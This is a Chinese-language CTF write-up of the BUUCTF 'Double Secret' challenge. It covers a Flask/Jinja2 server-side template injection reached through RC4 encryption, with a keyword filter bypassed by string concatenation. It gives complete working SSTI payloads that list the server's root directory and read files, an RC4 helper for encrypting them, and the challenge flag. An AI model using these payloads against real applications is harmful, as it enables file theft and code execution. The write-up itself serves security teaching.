---
title: "[CISCN2019 华东南赛区]Double Secret"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [ssti, rc4-encryption, flask, jinja2, keyword-bypass]
vulnerability: Flask SSTI with RC4 encryption and keyword filter bypass
solved: true
flag: "flag{599189bb-bf54-47d1-814a-4addb73e6c17}"
---

# [CISCN2019 华东南赛区]Double Secret

## 题目概述
Flask 应用存在 `/secret` 端点，接收 `secret` 参数并用 RC4 加密后渲染到模板中。题目名称 "Double Secret" 暗示双重处理（RC4 + 模板渲染）。

## 信息收集
1. 访问首页显示 `Welcome To Find Secret`
2. `/robots.txt` 返回 `It is Android ctf`（误导信息）
3. `/secret` 端点提示 `Tell me your secret.I will encrypt it so others can't see`
4. 测试 SSTI payload `{{7*7}}` 触发错误页面，泄露关键信息：
   - Python 2.7 + Flask + Jinja2
   - RC4 密钥：`HereIsTreasure`
   - 源码片段：`rc=rc4_Modified.RC4("HereIsTreasure"); deS=rc.do_crypt(secret); a=render_template_string(safe(deS))`
   - 存在 `safe()` 函数进行关键词过滤

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：服务端模板注入 (SSTI)

**原理**：
1. 用户输入经过 RC4 解密后直接传入 `render_template_string()`
2. `safe()` 函数过滤了敏感关键词：`class`, `mro`, `subclasses`, `globals`, `builtins`, `read`
3. 过滤方式为字符串匹配，可通过 Jinja2 字符串拼接绕过

**判断过程**：
- 输入 `{{config}}` 成功返回配置信息，确认 SSTI
- 输入 `{{''.__class__}}` 返回 `'class' is not allowed`，确认关键词过滤
- 使用 `'__cla'+'ss__'` 拼接成功绕过

## 利用过程（Payload + Flag）

**步骤 1**：列出根目录文件
```python
payload = "{{''|attr('__cla'+'ss__')|attr('__mr'+'o__')|attr('__getitem__')(2)|attr('__subcla'+'sses__')()|attr('__getitem__')(59)|attr('__init__')|attr('__glo'+'bals__')|attr('__getitem__')('__buil'+'tins__')|attr('__getitem__')('__im'+'port__')('os')|attr('listdir')('/')}}"
```
发现 `/flag.txt`

**步骤 2**：读取 flag
```python
# RC4 加密 payload
def rc4(key, data):
    S = list(range(256))
    j = 0
    key = [ord(c) for c in key]
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = []
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
    return ''.join(result)

key = "HereIsTreasure"
payload = "{{''|attr('__cla'+'ss__')|attr('__mr'+'o__')|attr('__getitem__')(2)|attr('__subcla'+'sses__')()|attr('__getitem__')(59)|attr('__init__')|attr('__glo'+'bals__')|attr('__getitem__')('__buil'+'tins__')|attr('__getitem__')('open')('/flag.txt')|attr('re'+'ad')()}}"

encrypted = rc4(key, payload)
# GET /secret?secret=<encrypted_payload>
```

**Flag**：`flag{599189bb-bf54-47d1-814a-4addb73e6c17}`

## 复现步骤
1. 访问 `/secret?secret={{7*7}}` 触发错误获取 RC4 密钥
2. 构造 SSTI payload，使用字符串拼接绕过关键词过滤
3. 用 RC4 密钥 `HereIsTreasure` 加密 payload
4. 发送加密后的 payload 到 `/secret` 端点
5. 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSTI | /secret?secret= | `'__cla'+'ss__'` 字符串拼接 | RC4 加密、Jinja2 attr 过滤器、Python 2.7 对象继承链 |

## 知识总结（解题技巧、同类题型套路）

1. **错误信息利用**：Flask debug 模式会泄露源码和敏感信息
2. **关键词过滤绕过**：Jinja2 中 `|attr()` 配合字符串拼接可绕过大部分关键词过滤
3. **RC4 特性**：RC4 是对称加密，加密和解密使用相同函数
4. **Python 2.7 SSTI 套路**：`''.__class__.__mro__[2].__subclasses__()` 获取所有类，找到含 `__builtins__` 的类执行命令
